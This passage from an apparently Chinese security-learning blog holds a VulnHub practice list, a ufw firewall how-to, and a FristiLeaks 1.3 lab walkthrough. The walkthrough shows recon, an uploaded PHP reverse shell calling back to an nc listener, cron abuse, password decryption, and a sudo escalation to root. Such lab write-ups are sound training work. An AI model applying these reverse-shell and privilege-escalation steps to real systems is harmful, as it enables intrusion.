<li>pWnOS 2.0: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">https://www.vulnhub.com/entry/pwnos-20-pre-release,34/</a></li>
<li>SkyTower 1: <a href="https://www.vulnhub.com/entry/skytower-1,96/">https://www.vulnhub.com/entry/skytower-1,96/</a></li>
<li>Mr-Robot 1: <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a></li>
<li>PwnLab: <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a></li>
<li>Metasploitable 3: <a href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a></li>
<li>Lin.Security: <a href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a></li>
<li>Temple of Doom: <a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/">https://www.vulnhub.com/entry/temple-of-doom-1,243/</a></li>
<li>Pinkys Palace v1: <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">https://www.vulnhub.com/entry/pinkys-palace-v1,225/</a></li>
<li>Pinkys Palace v2: <a href="https://www.vulnhub.com/entry/pinkys-palace-v2,229/">https://www.vulnhub.com/entry/pinkys-palace-v2,229/</a></li>
<li>Zico2: <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></li>
<li>Wintermute: <a href="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a></li>
<li>Lord of the root 1.0.1: <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a></li>
<li>Tr0ll 1: <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a></li>
<li>Tr0ll 2: <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">https://www.vulnhub.com/entry/tr0ll-2,107/</a></li>
<li>Web Developer 1: <a href="https://www.vulnhub.com/entry/web-developer-1,288/">https://www.vulnhub.com/entry/web-developer-1,288/</a></li>
<li>SolidState: <a href="https://www.vulnhub.com/entry/solidstate-1,261/">https://www.vulnhub.com/entry/solidstate-1,261/</a></li>
<li>Hackme 1: <a href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a></li>
<li>Escalate_Linux: 1: <a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">https://www.vulnhub.com/entry/escalate_linux-1,323/</a></li>
<li>DC: 6: <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
<li>IMF: <a href="https://www.vulnhub.com/entry/imf-1,162/">https://www.vulnhub.com/entry/imf-1,162/</a></li>
<li>Tommy Boy: <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a></li>
<li>Billy Madison: <a href="https://www.vulnhub.com/entry/billy-madison-11,161/">https://www.vulnhub.com/entry/billy-madison-11,161/</a></li>
<li>Tr0ll1: <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a></li>
<li>Tr0ll2: <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">https://www.vulnhub.com/entry/tr0ll-2,107/</a></li>
<li>Wallaby’s Nightmare: <a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a></li>
<li>Moria: <a href="https://www.vulnhub.com/entry/moria-1,187/">https://www.vulnhub.com/entry/moria-1,187/</a></li>
<li>BSides Vancouver 2018: <a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/</a></li>
<li>DEFCON Toronto Galahad: <a href="https://www.vulnhub.com/entry/defcon-toronto-galahad,194/">https://www.vulnhub.com/entry/defcon-toronto-galahad,194/</a></li>
<li>Spydersec: <a href="https://www.vulnhub.com/entry/spydersec-challenge,128/">https://www.vulnhub.com/entry/spydersec-challenge,128/</a></li>
<li>Pinkys Palace v3: <a href="https://www.vulnhub.com/entry/pinkys-palace-v3,237/">https://www.vulnhub.com/entry/pinkys-palace-v3,237/</a></li>
<li>Pinkys Palace v4: <a href="https://www.vulnhub.com/entry/pinkys-palace-v4,265/">https://www.vulnhub.com/entry/pinkys-palace-v4,265/</a></li>
<li>Vulnerable Docker 1: <a href="https://www.vulnhub.com/entry/vulnerable-docker-1,208/">https://www.vulnhub.com/entry/vulnerable-docker-1,208/</a></li>
<li>Node 1: <a href="https://www.vulnhub.com/entry/node-1,252/">https://www.vulnhub.com/entry/node-1,252/</a></li>
<li>Troll 3: <a href="https://www.vulnhub.com/entry/tr0ll-3,340/">https://www.vulnhub.com/entry/tr0ll-3,340/</a></li>
<li>Readme 1: <a href="https://www.vulnhub.com/entry/readme-1,336/">https://www.vulnhub.com/entry/readme-1,336/</a></li>
<li>OZ: <a href="https://www.vulnhub.com/entry/oz-1,317/">https://www.vulnhub.com/entry/oz-1,317/</a></li>
</ul>
<p>以上一共是48个靶机。计划每天都要做靶机渗透练习，五一劳动节之前把这些靶机都实验一遍，并做好过程记录。这篇博客常更新，完成一个靶机就更新一次。先把这些练习完了，再做进一步计划，现在的想法是练习了这些vulnhub的靶机之后，练习hackthebox。<br>以下是推荐的hackthebox练习靶机：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc1kqcvjyhj30lh0o0mxt.jpg" alt="image.png"></p>
<h2 id="靶机提权"><a href="#靶机提权" class="headerlink" title="靶机提权"></a>靶机提权</h2><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><ul>
<li><p>Linux提权指南：<br><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
</li>
<li><p>Linux提权辅助脚本：<br><a href="https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a href="https://github.com/HappyTreeFriend/linux-exploit-suggester">https://github.com/HappyTreeFriend/linux-exploit-suggester</a></p>
</li>
<li><p>Linux Exploits（EXP）：<br><a href="https://github.com/HappyTreeFriend/kernel-exploits">https://github.com/HappyTreeFriend/kernel-exploits</a></p>
</li>
</ul>
<h3 id="Windows-提权"><a href="#Windows-提权" class="headerlink" title="Windows 提权"></a>Windows 提权</h3><ul>
<li><p>Windows 提权指南：<br><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
</li>
<li><p>Windows 提权辅助脚本：<br><a href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></p>
</li>
<li><p>Windows Exploits ：<br><a href="https://github.com/abatchy17/WindowsExploits">https://github.com/abatchy17/WindowsExploits</a></p>
</li>
</ul>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://element-ui.cn/news/show-43855.aspx">http://element-ui.cn/news/show-43855.aspx</a></p>
]]></content>
      <categories>
        <category>学习计划</category>
        <category>丧必读</category>
      </categories>
      <tags>
        <tag>vulnhub靶机渗透</tag>
        <tag>学习计划</tag>
      </tags>
  </entry>
  <entry>
    <title>vps（ubuntu18.04）防火墙设置-仅开启v2ray端口</title>
    <url>//posts/ZH-CN/Vps_Firewall_Rule.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了增加vps的安全性，防止互联网的恶意扫描，我们需要以最小开放的原则给vps做防火墙策略。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>ubuntu18.04这个版本的系统，内置的防火墙是ufw，并且默认关闭（多危险啊……相当于大门敞开的，盗贼随便进嘛）。<br>我们要加强服务器的防御，只把必要的服务端口（v2ray的端口）开放至互联网，这样设置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw default deny #设置默认的规则为deny，这样除非指明打开的端口，否则所有端口默认都是关闭的。</span><br><span class="line">sudo ufw enable #启动了ufw防火墙（开机自启动）</span><br><span class="line">sudo ufw allow 443 #打开v2ray服务端口（因为我设置的v2ray端口是443）</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcxyx28rpaj30qp0c1gml.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ZYC88888/article/details/89380994">ubuntu系统ufw防火墙设置方法</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>ubuntu18.04</tag>
        <tag>vps</tag>
        <tag>ufw防火墙</tag>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之FristiLeaks_1.3</title>
    <url>//posts/ZH-CN/Vulnhub_FristiLeaks.html</url>
    <content><![CDATA[<h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>首先修改虚拟机的mac地址。<a href="https://docs.vmware.com/cn/VMware-Workstation-Pro/12.0/com.vmware.ws.using.doc/GUID-5C55C285-79B0-404F-95A5-87F64C41E3DC.html">vmware修改虚拟机MAC地址的方法</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gceuhdjd7cj30nw0q3406.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape><br>记得，虚拟机要改成NAT模式。<br>靶机IP为：192.168.80.21</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.21   08:00:27:a5:a6:76       PCS Systemtechnik GmbH</span><br><span class="line">192.168.80.254  00:50:56:e0:3c:3f       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.109 seconds (121.38 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>扫描发现靶机开放了80端口，并且robots.txt拒绝爬取<code>/cola</code>、<code>/sisi</code>、<code>/beer</code>这三个路径。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.21</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 00:30 EST</span><br><span class="line">Nmap scan report for 192.168.80.21</span><br><span class="line">Host is up (0.00081s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/cola /sisi /beer</span><br><span class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.81 ms 192.168.80.21</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds</span><br></pre></td></tr></table></figure>
<p>访问这些路径，发现打开都是这一张图片。<br><a href="http://192.168.80.21/cola/">http://192.168.80.21/cola/</a><br><a href="http://192.168.80.21/sisi/">http://192.168.80.21/sisi/</a><br><a href="http://192.168.80.21/beer/">http://192.168.80.21/beer/</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck5j5wmcnj30zo0ngakh.jpg" alt="image.png"><br>拓展知识：</p>
<blockquote>
<p>用curl查看http请求头详情信息：</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.80.21/sisi/ -v</span><br><span class="line">*   Trying 192.168.80.21:80...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 192.168.80.21 (192.168.80.21) port 80 (#0)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> GET /sisi/ HTTP/1.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Host: 192.168.80.21</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> User-Agent: curl/7.67.0</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Accept: */*</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Fri, 06 Mar 2020 13:42:59 GMT</span><br><span class="line">&lt; Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="line">&lt; Last-Modified: Wed, 25 Nov 2015 09:11:42 GMT</span><br><span class="line">&lt; ETag: &quot;3225-21-52559d8c3444b&quot;</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Content-Length: 33</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">&lt;img src=&quot;/images/3037440.jpg&quot;/&gt;</span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>
<h2 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统"></a>登录系统</h2><p>目录爆破（暂时没有爆破出来;)）得到网站登录入口地址：<a href="http://192.168.80.21/fristi/">http://192.168.80.21/fristi/</a><br>查看网页源码，提示我们：用户ezeepz用户的密码在base64字符串里面。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck7y4ac2lj30zn0n9td9.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck7t17gouj30zj0ndag7.jpg" alt="image.png"><br>我们将base64字符串解码存为png图片。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &#x27;iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==&#x27; | base64 -d &gt; evidence-6.png</span><br></pre></td></tr></table></figure>
<p>打开这个图片，获得用户密码是：<code>keKkeKKeKKeKkEkkEk</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck80jrerlj30zt0no7ki.jpg" alt="image.png"><br>使用获取到的用户和密码（eezeepz/keKkeKKeKKeKkEkkEk），登录到系统：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck8276pjsj30zs0nfab3.jpg" alt="image.png"></p>
<h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><p>kali自带的webshell脚本位于<code>/usr/share/webshells/php</code>，我们修改这个<code>php-reverse-shell.php</code>。IP改为靶机IP（192.168.80.14），端口改为靶机监听端口（6666）。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck8rcp18xj30oy0iqaed.jpg" alt="image.png"><br>上传<code>php-reverse-shell.php</code>至靶机之后，访问url：<a href="http://192.168.80.21/fristi/uploads/php-reverse-shell.php.png">http://192.168.80.21/fristi/uploads/php-reverse-shell.php.png</a> 即可进入apache用户的shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/usr/share/webshells/php$ nc -nlvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.80.14] from (UNKNOWN) [192.168.80.21] 43835</span><br><span class="line">Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 10:19:44 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br><span class="line">sh: no job control in this shell</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh-4.1$ ccdd  eeeezzeeeeppzz</span><br><span class="line"></span><br><span class="line">sh-4.1$ llss</span><br><span class="line"></span><br><span class="line">MAKEDEV</span><br><span class="line">cbq</span><br><span class="line">cciss_id</span><br><span class="line">cfdisk</span><br><span class="line">chcpu</span><br><span class="line">chgrp</span><br><span class="line">chkconfig</span><br><span class="line">chmod</span><br><span class="line">chown</span><br><span class="line">clock</span><br><span class="line">consoletype</span><br><span class="line">cpio</span><br><span class="line">cryptsetup</span><br><span class="line">ctrlaltdel</span><br><span class="line">cut</span><br><span class="line">halt</span><br><span class="line">hostname</span><br><span class="line">hwclock</span><br><span class="line">kbd_mode</span><br><span class="line">kill</span><br><span class="line">killall5</span><br><span class="line">kpartx</span><br><span class="line">nameif</span><br><span class="line">nano</span><br><span class="line">netreport</span><br><span class="line">netstat</span><br><span class="line">new-kernel-pkg</span><br><span class="line">nice</span><br><span class="line">nisdomainname</span><br><span class="line">nologin</span><br><span class="line">notes.txt</span><br><span class="line">tar</span><br><span class="line">taskset</span><br><span class="line">tc</span><br><span class="line">telinit</span><br><span class="line">touch</span><br><span class="line">tracepath</span><br><span class="line">tracepath6</span><br><span class="line">true</span><br><span class="line">tune2fs</span><br><span class="line">weak-modules</span><br><span class="line">wipefs</span><br><span class="line">xfs_repair</span><br><span class="line">ypdomainname</span><br><span class="line">zcat</span><br><span class="line">zic</span><br><span class="line">sh-4.1$ ccaatt  nnootteess..ttxxtt</span><br><span class="line"></span><br><span class="line">Yo EZ,</span><br><span class="line"></span><br><span class="line">I made it possible for you to do some automated checks, </span><br><span class="line">but I did only allow you access to /usr/bin/* system binaries. I did</span><br><span class="line">however copy a few extra often needed commands to my </span><br><span class="line">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</span><br><span class="line">from /home/admin/</span><br><span class="line"></span><br><span class="line">Don&#x27;t forget to specify the full path for each binary!</span><br><span class="line"></span><br><span class="line">Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The </span><br><span class="line">output goes to the file &quot;cronresult&quot; in /tmp/. It should </span><br><span class="line">run every minute with my account privileges.</span><br><span class="line"></span><br><span class="line">- Jerry</span><br></pre></td></tr></table></figure>
<p>进入<code>/temp</code>目录，新建文件<code>runthis</code>设置计划任务（这个计划任务每分钟执行），修改<code>/home/admin</code>的权限为777，使得ezeepz可访问admin目录的内容。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh-4.1$ ccaatt  rruunntthhiiss</span><br><span class="line"></span><br><span class="line">/home/admin/chmod 777 /home/admin</span><br></pre></td></tr></table></figure>
<p>于是，<code>/home/admin</code>目录已具备<code>777</code>权限，ezeepz可访问admin目录的内容。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh-4.1$ llss  --ll</span><br><span class="line"></span><br><span class="line">total 20</span><br><span class="line">drwxrwxrwx. 2 admin     admin      4096 Nov 19  2015 admin</span><br><span class="line">drwx---r-x. 5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz</span><br><span class="line">drwx------  2 fristigod fristigod  4096 Nov 19  2015 fristigod</span><br></pre></td></tr></table></figure>
<p>进入admin目录，发现以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">h-4.1$ ccdd  aaddmmiinn</span><br><span class="line"></span><br><span class="line">sh-4.1$ llss</span><br><span class="line"></span><br><span class="line">cat</span><br><span class="line">chmod</span><br><span class="line">cronjob.py</span><br><span class="line">cryptedpass.txt</span><br><span class="line">cryptpass.py</span><br><span class="line">df</span><br><span class="line">echo</span><br><span class="line">egrep</span><br><span class="line">grep</span><br><span class="line">ps</span><br><span class="line">whoisyourgodnow.txt</span><br></pre></td></tr></table></figure>
<p>关键的文件：<code>cryptedpass.txt</code>、<code>cryptpass.py</code>、<code>whoisyourgodnow.txt</code>。这两个txt是密文，而py文件是加密算法实现方式。<br>我们根据这个py文件，反推出解密算法程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat decryptpass.py </span><br><span class="line"><span class="meta">#</span><span class="bash">Wrote this simple <span class="keyword">function</span> to solve the CTF designed <span class="keyword">for</span> FristiLeaks v1.3 VulnHub VM</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line">import base64,codecs,sys</span><br><span class="line"></span><br><span class="line">def decodeString(str):</span><br><span class="line">    decode = codecs.decode(str[::-1], &#x27;rot13&#x27;)</span><br><span class="line">    return base64.b64decode(decode)</span><br><span class="line"></span><br><span class="line">cryptoResult=decodeString(sys.argv[1])</span><br><span class="line">print cryptoResult</span><br></pre></td></tr></table></figure>
<p>解密结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gck9a342i4j31660ixk59.jpg" alt="image.png"></p>
<h2 id="登入fristigod用户并提权"><a href="#登入fristigod用户并提权" class="headerlink" title="登入fristigod用户并提权"></a>登入fristigod用户并提权</h2><p>使用密码登录fristigod用户：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh-4.1$ ssuu  --  ffrriissttiiggoodd</span><br><span class="line"></span><br><span class="line">standard in must be a tty</span><br></pre></td></tr></table></figure>
<p>这里无法登录fristigod用户，要进入完全shell模式。<br>拓展知识：</p>
<blockquote>
<p><a href="http://blog.sina.com.cn/s/blog_6c0267490102wnmn.html">sh和bash的区别</a><br><code>/bin/sh</code>相当于<code>/bin/bash --posix</code>，sh跟bash的区别，实际上就是bash有没有开启<a href="https://blog.csdn.net/MONKEY_D_MENG/article/details/5621749">posix模式</a>的区别。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">h-4.1$ ppyytthhoonn  --cc  &#x27;&#x27;iimmppoorrtt  ppttyy;;ppttyy..ssppaawwnn((&quot;&quot;//bbiinn//bbaasshh&quot;&quot;))&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">bash-4.1$ ssuu  --  ffrriissttiiggoodd</span><br><span class="line"></span><br><span class="line">Password: LetThereBeFristi!</span><br><span class="line"></span><br><span class="line">-bash-4.1$ wwhhooaammii</span><br><span class="line"></span><br><span class="line">fristigod</span><br></pre></td></tr></table></figure>
<p>登入fistigod用户之后，查看命令历史：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-bash-4.1$ ppwwdd</span><br><span class="line"></span><br><span class="line">/var/fristigod</span><br><span class="line">-bash-4.1$ llss  --llaa</span><br><span class="line"></span><br><span class="line">total 16</span><br><span class="line">drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .</span><br><span class="line">drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..</span><br><span class="line">-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history</span><br><span class="line">drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff</span><br><span class="line">-bash-4.1$ ccaatt  ..bbaasshh   _history </span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">ls -lah</span><br><span class="line">cd .secret_admin_stuff/</span><br><span class="line">ls</span><br><span class="line">./doCom </span><br><span class="line">./doCom test</span><br><span class="line">sudo ls</span><br><span class="line">exit</span><br><span class="line">cd .secret_admin_stuff/</span><br><span class="line">ls</span><br><span class="line">./doCom </span><br><span class="line">sudo -u fristi ./doCom ls /</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">groups</span><br><span class="line">ls -lah</span><br><span class="line">usermod -G fristigod fristi</span><br><span class="line">exit</span><br><span class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</span><br><span class="line">less /var/log/secure e</span><br><span class="line">Fexit</span><br><span class="line">exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>发现fristigod这个用户使用<code>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</code>这条命令进行操作，似乎能进入root权限。<br>我们试一下这条命令：<code>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</code>，果然拿到了root权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-bash-4.1$ ssuuddoo  --uu  ffrriissttii  //vvaarr//ffrriissttiiggoodd//..sseeccrreett__aaddmmiinn__ssttuuffff//ddooCCii^oomm  iidd</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=100(users) groups=100(users),502(fristigod)</span><br></pre></td></tr></table></figure>
